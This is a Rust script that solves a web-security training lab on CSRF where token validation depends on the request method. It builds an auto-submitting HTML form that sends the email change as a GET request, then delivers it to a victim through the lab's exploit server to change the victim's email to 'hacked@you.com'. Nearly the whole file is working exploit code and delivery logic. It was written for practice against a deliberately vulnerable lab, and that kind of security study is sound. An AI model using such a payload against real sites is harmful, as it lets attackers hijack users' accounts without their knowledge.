/*************************************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 21/10/2023
*
* Lab: CSRF where token validation depends on request method
*
* Steps: 1. Craft an HTML form for changing the email address with an auto-submit
*           script and use the GET method rather than POST as the form method
*        2. Deliver the exploit to the victim
*        3. The victim's email will be changed after he trigger the exploit
*
**************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let lab_url = "https://0ab6009f047e2b0787adb80100fc00ad.web-security-academy.net";

    // change this to your exploit server URL
    let exploit_server_url = "https://exploit-0aca00a204332be087a8b70c018f002e.exploit-server.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    // the header of your exploit sever response
    let exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8";

    // the new email
    // you can change this to what you want
    let new_email = "hacked@you.com";

    // payload to change the victim's email
    let payload = format!(
        r###"<html>
                <body>
                <form action="{lab_url}/my-account/change-email">
                    <input type="hidden" name="email" value="{new_email}" />
                    <input type="hidden" name="csrf" value="b2eUm7UybY24D3Jjnda5t2OUib3N2Cvr" />
                    <input type="submit" value="Submit request" />
                </form>
                <script>
                    document.forms[0].submit();
                </script>
                </body>
            </html>   
      "###
    );

    print!("{}", "❯❯ Delivering the exploit to the victim.. ".white(),);
    io::stdout().flush();

    // deliver the exploit to the victim
    client
        .post(exploit_server_url)
        .form(&HashMap::from([
            ("formAction", "DELIVER_TO_VICTIM"),
            ("urlIsHttps", "on"),
            ("responseFile", "/exploit"),
            ("responseHead", exploit_server_head),
            ("responseBody", &payload),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to deliver the exploit to the victim".red()
        ));

    println!("{}", "OK".green());
    println!(
        "{}",
        "🗹 The victim's email will be changed after he trigger the exploit".white()
    );
    println!(
        "{} {}",
        "🗹 Check your browser, it should be marked now as".white(),
        "solved".green()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::default())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}